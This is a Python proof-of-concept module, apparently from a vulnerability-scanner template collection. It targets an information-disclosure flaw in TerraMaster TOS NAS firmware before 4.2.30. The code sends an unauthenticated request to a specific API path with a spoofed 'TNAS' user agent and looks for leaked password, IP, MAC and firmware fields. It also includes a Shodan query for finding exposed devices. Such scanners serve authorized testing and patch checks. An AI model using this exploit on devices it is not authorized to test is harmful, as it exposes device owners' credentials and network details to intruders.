import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''TerraMaster TOS < 4.2.30 - Server Information Disclosure''',
        "description": '''TerraMaster NAS devices running TOS prior to version
4.2.30 is vulnerable to information disclosure''',
        "severity": "medium",
        "references": [
            "https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''TerraMaster'''
        },
        "tags": ["cve", "cve2022", "terramaster", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        headers = {
            "User-Agent": "TNAS"
        }
        path = '/module/api.php?mobile/webNasIPS'

        resp = requests.get(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "application/json" in str(resp.headers) and "TerraMaster" in str(resp.headers) and (re.search(r'webNasIPS successful', resp.text) or re.search(r'(ADDR|(IFC|PWD|[DS]AT)):', resp.text) or re.search(r'"((firmware|(version|ma(sk|c)|port|url|ip))|hostname)":', resp.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url